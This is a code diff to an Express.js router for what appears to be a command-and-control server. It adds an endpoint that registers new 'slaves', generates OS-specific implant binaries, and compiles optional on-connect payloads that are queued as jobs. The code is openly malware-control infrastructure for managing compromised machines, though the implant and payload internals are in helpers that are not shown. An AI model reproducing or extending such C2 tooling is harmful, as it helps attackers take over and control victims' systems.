@@ -4,6 +4,9 @@
 const router = express.Router();
 const userMiddleware = require("../../middlewares/UserMiddleware");
 
+const implantGenerator = require("../../helpers/ImplantGeneratorHelper")
+const payloadHelper = require("../../helpers/PayloadHelper")
+
 router.post("/login", (req, res) => {
 
     const token = cryptoHelper.createID();
@@ -33,8 +36,62 @@ router.get("/ping", userMiddleware.hasAuthToken, (req, res) => {
 router.post("/slaves", userMiddleware.checkNewGeneration, (req, res) => {
 
     const newSlave = req.body;
+
+    // Create new slave ID.
+    const slaveId = cryptoHelper.createID();
+
+    // Check if there is an onconnect payload.
+    if (newSlave.payload) {
+
+        // Create new job for the newly slave.
+        const jobId = cryptoHelper.createID();
+        const selectedPayload = databaseHelper.getPayloadById(newSlave.payload);
+
+        payloadHelper.compilePayload(selectedPayload, jobId, newSlave.variables, (path, size) => {
+
+            console.log("Compiled succesfully and generated new job")
+            databaseHelper.addNewJob({
+                id: jobId,
+                slaveId: slaveId,
+                payloadId: newSlave.payload,
+                objectSize: size,
+                location: path,
+                variables: newSlave.variables
+            })
+        }, (err, compileError) => {
+
+            if (compileError)
+                res.status(400).json({message: "Compile error!", compileError: err});
+            else
+                res.status(400).json({message: err});
+        })
+    }
+
+    implantGenerator.generateImplant(slaveId, newSlave.os, (binaryPath) => {
+
+        console.log("Generating implant success! path: " + binaryPath)
+        res.json({path: binaryPath});
+        
+    }, (err, compileError = false) => {
+
+        console.error("Generating implant failed!");
+        if (compileError) 
+            console.error("Due to compilation of binary!");
+        console.error(err);
+
+        if (compileError) 
+            res.status(400).json({message: "Failed to compile new implant!", compileError: err});
+        else
+            res.status(400).json({message: err})
+    })
+
+    // Generate implant.
+    // console.log("Generating new slave for os " + newSlave.os + "....");
+    // if (newSlave.payload)
+    //     console.log("With payload " + newSlave.payload)
+    // if (newSlave.variables)
+    //     console.log("Containing variables: " + JSON.stringify(newSlave.variables))
     
-    // ...
 })
 
 // Retrieve all slaves.
